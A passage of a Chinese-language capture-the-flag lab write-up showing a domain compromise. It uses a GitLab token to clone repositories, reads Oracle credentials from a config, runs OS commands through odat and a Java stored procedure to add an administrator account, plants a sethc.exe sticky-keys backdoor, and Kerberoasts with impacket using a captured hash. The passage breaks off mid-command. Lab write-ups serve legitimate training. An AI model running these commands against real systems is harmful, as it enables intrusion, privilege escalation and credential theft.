+</span></span><span class="line"><span class="cl">        &#34;auto_devops_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;auto_devops_deploy_strategy&#34;: &#34;continuous&#34;,
+</span></span><span class="line"><span class="cl">        &#34;autoclose_referenced_issues&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;keep_latest_artifact&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;runner_token_expiration_interval&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;permissions&#34;: {
+</span></span><span class="line"><span class="cl">            &#34;project_access&#34;: {
+</span></span><span class="line"><span class="cl">                &#34;access_level&#34;: 40,
+</span></span><span class="line"><span class="cl">                &#34;notification_level&#34;: null
+</span></span><span class="line"><span class="cl">            },
+</span></span><span class="line"><span class="cl">            &#34;group_access&#34;: {
+</span></span><span class="line"><span class="cl">                &#34;access_level&#34;: 50,
+</span></span><span class="line"><span class="cl">                &#34;notification_level&#34;: 3
+</span></span><span class="line"><span class="cl">            }
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    },
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">        &#34;id&#34;: 1,
+</span></span><span class="line"><span class="cl">        &#34;description&#34;: &#34;This project is automatically generated and helps monitor this GitLab instance. [Learn more](/help/administration/monitoring/gitlab_self_monitoring_project/index).&#34;,
+</span></span><span class="line"><span class="cl">        &#34;name&#34;: &#34;Monitoring&#34;,
+</span></span><span class="line"><span class="cl">        &#34;name_with_namespace&#34;: &#34;GitLab Instance / Monitoring&#34;,
+</span></span><span class="line"><span class="cl">        &#34;path&#34;: &#34;Monitoring&#34;,
+</span></span><span class="line"><span class="cl">        &#34;path_with_namespace&#34;: &#34;gitlab-instance-23352f48/Monitoring&#34;,
+</span></span><span class="line"><span class="cl">        &#34;created_at&#34;: &#34;2022-12-25T07:18:20.914Z&#34;,
+</span></span><span class="line"><span class="cl">        &#34;default_branch&#34;: &#34;main&#34;,
+</span></span><span class="line"><span class="cl">        &#34;tag_list&#34;: [
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        ],
+</span></span><span class="line"><span class="cl">        &#34;topics&#34;: [
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        ],
+</span></span><span class="line"><span class="cl">        &#34;ssh_url_to_repo&#34;: &#34;git@gitlab.xiaorang.lab:gitlab-instance-23352f48/Monitoring.git&#34;,
+</span></span><span class="line"><span class="cl">        &#34;http_url_to_repo&#34;: &#34;http://gitlab.xiaorang.lab/gitlab-instance-23352f48/Monitoring.git&#34;,
+</span></span><span class="line"><span class="cl">        &#34;web_url&#34;: &#34;http://gitlab.xiaorang.lab/gitlab-instance-23352f48/Monitoring&#34;,
+</span></span><span class="line"><span class="cl">        &#34;readme_url&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;avatar_url&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;forks_count&#34;: 0,
+</span></span><span class="line"><span class="cl">        &#34;star_count&#34;: 0,
+</span></span><span class="line"><span class="cl">        &#34;last_activity_at&#34;: &#34;2022-12-25T07:18:20.914Z&#34;,
+</span></span><span class="line"><span class="cl">        &#34;namespace&#34;: {
+</span></span><span class="line"><span class="cl">            &#34;id&#34;: 2,
+</span></span><span class="line"><span class="cl">            &#34;name&#34;: &#34;GitLab Instance&#34;,
+</span></span><span class="line"><span class="cl">            &#34;path&#34;: &#34;gitlab-instance-23352f48&#34;,
+</span></span><span class="line"><span class="cl">            &#34;kind&#34;: &#34;group&#34;,
+</span></span><span class="line"><span class="cl">            &#34;full_path&#34;: &#34;gitlab-instance-23352f48&#34;,
+</span></span><span class="line"><span class="cl">            &#34;parent_id&#34;: null,
+</span></span><span class="line"><span class="cl">            &#34;avatar_url&#34;: null,
+</span></span><span class="line"><span class="cl">            &#34;web_url&#34;: &#34;http://gitlab.xiaorang.lab/groups/gitlab-instance-23352f48&#34;
+</span></span><span class="line"><span class="cl">        },
+</span></span><span class="line"><span class="cl">        &#34;_links&#34;: {
+</span></span><span class="line"><span class="cl">            &#34;self&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/1&#34;,
+</span></span><span class="line"><span class="cl">            &#34;issues&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/1/issues&#34;,
+</span></span><span class="line"><span class="cl">            &#34;merge_requests&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/1/merge_requests&#34;,
+</span></span><span class="line"><span class="cl">            &#34;repo_branches&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/1/repository/branches&#34;,
+</span></span><span class="line"><span class="cl">            &#34;labels&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/1/labels&#34;,
+</span></span><span class="line"><span class="cl">            &#34;events&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/1/events&#34;,
+</span></span><span class="line"><span class="cl">            &#34;members&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/1/members&#34;,
+</span></span><span class="line"><span class="cl">            &#34;cluster_agents&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/1/cluster_agents&#34;
+</span></span><span class="line"><span class="cl">        },
+</span></span><span class="line"><span class="cl">        &#34;packages_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;empty_repo&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;archived&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;visibility&#34;: &#34;internal&#34;,
+</span></span><span class="line"><span class="cl">        &#34;resolve_outdated_diff_discussions&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;container_expiration_policy&#34;: {
+</span></span><span class="line"><span class="cl">            &#34;cadence&#34;: &#34;1d&#34;,
+</span></span><span class="line"><span class="cl">            &#34;enabled&#34;: false,
+</span></span><span class="line"><span class="cl">            &#34;keep_n&#34;: 10,
+</span></span><span class="line"><span class="cl">            &#34;older_than&#34;: &#34;90d&#34;,
+</span></span><span class="line"><span class="cl">            &#34;name_regex&#34;: &#34;.*&#34;,
+</span></span><span class="line"><span class="cl">            &#34;name_regex_keep&#34;: null,
+</span></span><span class="line"><span class="cl">            &#34;next_run_at&#34;: &#34;2022-12-26T07:18:21.108Z&#34;
+</span></span><span class="line"><span class="cl">        },
+</span></span><span class="line"><span class="cl">        &#34;issues_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;merge_requests_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;wiki_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;jobs_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;snippets_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;container_registry_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;service_desk_enabled&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;can_create_merge_request_in&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;issues_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;repository_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;merge_requests_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;forking_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;wiki_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;builds_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;snippets_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;pages_access_level&#34;: &#34;private&#34;,
+</span></span><span class="line"><span class="cl">        &#34;operations_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;analytics_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;container_registry_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;security_and_compliance_access_level&#34;: &#34;private&#34;,
+</span></span><span class="line"><span class="cl">        &#34;releases_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;environments_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;feature_flags_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;infrastructure_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;monitor_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;emails_disabled&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;shared_runners_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;lfs_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;creator_id&#34;: 1,
+</span></span><span class="line"><span class="cl">        &#34;import_status&#34;: &#34;none&#34;,
+</span></span><span class="line"><span class="cl">        &#34;open_issues_count&#34;: 0,
+</span></span><span class="line"><span class="cl">        &#34;ci_default_git_depth&#34;: 20,
+</span></span><span class="line"><span class="cl">        &#34;ci_forward_deployment_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;ci_job_token_scope_enabled&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;ci_separated_caches&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;ci_opt_in_jwt&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;ci_allow_fork_pipelines_to_run_in_parent_project&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;public_jobs&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;build_timeout&#34;: 3600,
+</span></span><span class="line"><span class="cl">        &#34;auto_cancel_pending_pipelines&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;ci_config_path&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;shared_with_groups&#34;: [
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        ],
+</span></span><span class="line"><span class="cl">        &#34;only_allow_merge_if_pipeline_succeeds&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;allow_merge_on_skipped_pipeline&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;restrict_user_defined_variables&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;request_access_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;only_allow_merge_if_all_discussions_are_resolved&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;remove_source_branch_after_merge&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;printing_merge_request_link_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;merge_method&#34;: &#34;merge&#34;,
+</span></span><span class="line"><span class="cl">        &#34;squash_option&#34;: &#34;default_off&#34;,
+</span></span><span class="line"><span class="cl">        &#34;enforce_auth_checks_on_uploads&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;suggestion_commit_message&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;merge_commit_template&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;squash_commit_template&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;issue_branch_template&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;auto_devops_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;auto_devops_deploy_strategy&#34;: &#34;continuous&#34;,
+</span></span><span class="line"><span class="cl">        &#34;autoclose_referenced_issues&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;keep_latest_artifact&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;runner_token_expiration_interval&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;permissions&#34;: {
+</span></span><span class="line"><span class="cl">            &#34;project_access&#34;: null,
+</span></span><span class="line"><span class="cl">            &#34;group_access&#34;: null
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">]
+</span></span></code></pre></div></div><p>克隆这三个项目</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">git clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/internal-secret.git
+</span></span><span class="line"><span class="cl">git clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/xradmin.git
+</span></span><span class="line"><span class="cl">git clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/xrwiki.git
+</span></span></code></pre></div></div><p>得到配置</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">cat application-druid.yml 
+</span></span><span class="line"><span class="cl"># 数据源配置
+</span></span><span class="line"><span class="cl">spring:
+</span></span><span class="line"><span class="cl">    datasource:
+</span></span><span class="line"><span class="cl">        type: com.alibaba.druid.pool.DruidDataSource
+</span></span><span class="line"><span class="cl">        driverClassName: oracle.jdbc.driver.OracleDriver
+</span></span><span class="line"><span class="cl">        druid:
+</span></span><span class="line"><span class="cl">            # 主库数据源
+</span></span><span class="line"><span class="cl">            master:
+</span></span><span class="line"><span class="cl">                url: jdbc:oracle:thin:@172.22.14.31:1521/orcl
+</span></span><span class="line"><span class="cl">                username: xradmin
+</span></span><span class="line"><span class="cl">                password: fcMyE8t9E4XdsKf
+</span></span><span class="line"><span class="cl">            # 从库数据源
+</span></span><span class="line"><span class="cl">            slave:
+</span></span><span class="line"><span class="cl">                # 从数据源开关/默认关闭
+</span></span><span class="line"><span class="cl">                enabled: false
+</span></span><span class="line"><span class="cl">                url: 
+</span></span><span class="line"><span class="cl">                username: 
+</span></span><span class="line"><span class="cl">                password: 
+</span></span><span class="line"><span class="cl">            # 初始连接数
+</span></span><span class="line"><span class="cl">            initialSize: 5
+</span></span><span class="line"><span class="cl">            # 最小连接池数量
+</span></span><span class="line"><span class="cl">            minIdle: 10
+</span></span><span class="line"><span class="cl">            # 最大连接池数量
+</span></span><span class="line"><span class="cl">            maxActive: 20
+</span></span><span class="line"><span class="cl">            # 配置获取连接等待超时的时间
+</span></span><span class="line"><span class="cl">            maxWait: 60000
+</span></span><span class="line"><span class="cl">            # 配置间隔多久才进行一次检测，检测需要关闭的空闲连接，单位是毫秒
+</span></span><span class="line"><span class="cl">            timeBetweenEvictionRunsMillis: 60000
+</span></span><span class="line"><span class="cl">            # 配置一个连接在池中最小生存的时间，单位是毫秒
+</span></span><span class="line"><span class="cl">            minEvictableIdleTimeMillis: 300000
+</span></span><span class="line"><span class="cl">            # 配置一个连接在池中最大生存的时间，单位是毫秒
+</span></span><span class="line"><span class="cl">            maxEvictableIdleTimeMillis: 900000
+</span></span><span class="line"><span class="cl">            # 配置检测连接是否有效
+</span></span><span class="line"><span class="cl">            validationQuery: SELECT 1 FROM DUAL
+</span></span><span class="line"><span class="cl">            testWhileIdle: true
+</span></span><span class="line"><span class="cl">            testOnBorrow: false
+</span></span><span class="line"><span class="cl">            testOnReturn: false
+</span></span><span class="line"><span class="cl">            webStatFilter: 
+</span></span><span class="line"><span class="cl">                enabled: true
+</span></span><span class="line"><span class="cl">            statViewServlet:
+</span></span><span class="line"><span class="cl">                enabled: true
+</span></span><span class="line"><span class="cl">                # 设置白名单，不填则允许所有访问
+</span></span><span class="line"><span class="cl">                allow:
+</span></span><span class="line"><span class="cl">                url-pattern: /druid/*
+</span></span><span class="line"><span class="cl">                # 控制台管理用户名和密码
+</span></span><span class="line"><span class="cl">                login-username: 
+</span></span><span class="line"><span class="cl">                login-password: 
+</span></span><span class="line"><span class="cl">            filter:
+</span></span><span class="line"><span class="cl">                stat:
+</span></span><span class="line"><span class="cl">                    enabled: true
+</span></span><span class="line"><span class="cl">                    # 慢SQL记录
+</span></span><span class="line"><span class="cl">                    log-slow-sql: true
+</span></span><span class="line"><span class="cl">                    slow-sql-millis: 1000
+</span></span><span class="line"><span class="cl">                    merge-sql: true
+</span></span><span class="line"><span class="cl">                wall:
+</span></span><span class="line"><span class="cl">                    config:
+</span></span><span class="line"><span class="cl">                        multi-statement-allow: true
+</span></span></code></pre></div></div><p><code>jdbc:oracle:thin:@172.22.14.31:1521/orcl</code></p>
+<p><code>xradmin:fcMyE8t9E4XdsKf</code></p>
+<p>用odat去连接</p>
+<p>x64的,丢服务器上了,额,docker应该也可以额</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">proxychains ./odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --exec &#39;net user dionysus QWE123qwe. /add&#39; 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">proxychains odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --exec &#39;net localgroup administrators dionysus /add&#39;
+</span></span></code></pre></div></div><p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240419162232.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240419162232.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>手动选这个,navicat就链接上了</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">select * from v$version;
+</span></span></code></pre></div></div><p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240419162707.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240419162707.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>依次执行</p>
+<p>#oracle数据库命令注入</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">begin dbms_java.grant_permission( &#39;XRADMIN&#39;, &#39;SYS:java.io.FilePermission&#39;, &#39;&lt;&lt;ALL FILES&gt;&gt;&#39;, &#39;read,write,execute,delete&#39;);end;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">begin dbms_java.grant_permission( &#39;XRADMIN&#39;, &#39;SYS:java.lang.RuntimePermission&#39;, &#39;writeFileDescriptor&#39;, &#39;&#39;);end;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">begin dbms_java.grant_permission( &#39;XRADMIN&#39;, &#39;SYS:java.lang.RuntimePermission&#39;, &#39;readFileDescriptor&#39;, &#39;&#39; );end;
+</span></span></code></pre></div></div><div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">declare sql_command varchar2(32767);
+</span></span><span class="line"><span class="cl">begin sql_command := &#39;create or replace and compile java source named &#34;Command&#34;
+</span></span><span class="line"><span class="cl">as
+</span></span><span class="line"><span class="cl">import java.io.ByteArrayOutputStream;
+</span></span><span class="line"><span class="cl">import java.io.InputStream;
+</span></span><span class="line"><span class="cl">public class Command {
+</span></span><span class="line"><span class="cl">    public static String exec(String cmd) throws Exception{
+</span></span><span class="line"><span class="cl">        Process process = Runtime.getRuntime().exec(cmd);
+</span></span><span class="line"><span class="cl">        InputStream input = process.getInputStream();
+</span></span><span class="line"><span class="cl">        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+</span></span><span class="line"><span class="cl">        int n;
+</span></span><span class="line"><span class="cl">        byte[] buffer = new byte[1024];
+</span></span><span class="line"><span class="cl">        while ((n = input.read(buffer)) != -1) {
+</span></span><span class="line"><span class="cl">            baos.write(buffer);
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        return baos.toString();
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}&#39;;
+</span></span><span class="line"><span class="cl">execute immediate sql_command;
+</span></span><span class="line"><span class="cl">end;
+</span></span></code></pre></div></div><div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">create or replace function rbexec(cmd varchar2) return varchar2 as language java name &#39;Command.exec(java.lang.String) return java.lang.String&#39;;
+</span></span></code></pre></div></div><div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">select rbexec(&#39;whoami&#39;) from dual;
+</span></span></code></pre></div></div><p>然后就可以执行命令了,先加用户</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">net user dionysus QWE123qwe. /add
+</span></span><span class="line"><span class="cl">net localgroup administrators dionysus /add
+</span></span></code></pre></div></div><p>上viper 拿到第二个flag</p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240419164359.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240419164359.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>之前的好多git里还有有用的</p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240419164702.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240419164702.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240419165016.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240419165016.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>是这样的,用evil</p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240419165202.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240419165202.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240419165208.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240419165208.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>evil的权限好像比较高</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">ren sethc.exe sethc.bak
+</span></span><span class="line"><span class="cl">ren cmd.exe sethc.exe
+</span></span></code></pre></div></div><p>锁屏界面五下shift 直接弹cmd了</p>
+<p>上viper,差最后一个域控</p>
+<p>应该是改了这个cmd导致后面的猕猴桃各种报错,要先改回来</p>
+<p><code>ren sethc.exe cmd.exe</code></p>
+<p>然后成功拿到hash了</p>
+<p><code>:bb20f831c1950cb4d14832b87ae0f48d</code></p>
+<p><code>proxychains impacket-GetUserSPNs xiaorang.lab/'XR-0923$' -hashes ':bb20f831c1950cb4d14832b87ae0f48d' -dc-ip 172.22.14.11</code></p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[proxychains] config file found: /etc/proxychains4.conf
+</span></span><span class="line"><span class="cl">[proxychains] preloading /usr/lib/aarch64-linux-gnu/libproxychains.so.4
+</span></span><span class="line"><span class="cl">[proxychains] DLL init: proxychains-ng 4.17
+</span></span><span class="line"><span class="cl">[proxychains] DLL init: proxychains-ng 4.17
+</span></span><span class="line"><span class="cl">[proxychains] DLL init: proxychains-ng 4.17
+</span></span><span class="line"><span class="cl">Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[proxychains] Strict chain  ...  8.149.142.195:7777  ...  172.22.14.11:389  ...  OK
+</span></span><span class="line"><span class="cl">ServicePrincipalName           Name      MemberOf                                                  PasswordLastSet             LastLogon  Delegation 
+</span></span><span class="line"><span class="cl">-----------------------------  --------  --------------------------------------------------------  --------------------------  ---------  ----------
+</span></span><span class="line"><span class="cl">TERMSERV/xr-0923.xiaorang.lab  tianjing  CN=Remote Management Users,CN=Builtin,DC=xiaorang,DC=lab  2023-05-30 18:25:11.564883  &lt;never&gt;               
+</span></span><span class="line"><span class="cl">WWW/xr-0923.xiaorang.lab/IIS   tianjing  CN=Remote Management Users,CN=Builtin,DC=xiaorang,DC=lab  2023-05-30 18:25:11.564883  &lt;never&gt;     
+</span></span></code></pre></div></div><p>看到两个服务</p>
+<p>抓hash`</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">proxychains impacket-GetUserSPNs xiaorang.lab/&#39;XR-0923$&#39; -hashes &#39;:bb20f831c1950cb4d14832b87ae0f48d&#39; -dc-ip 172.22.14.11 -request-user tianjing
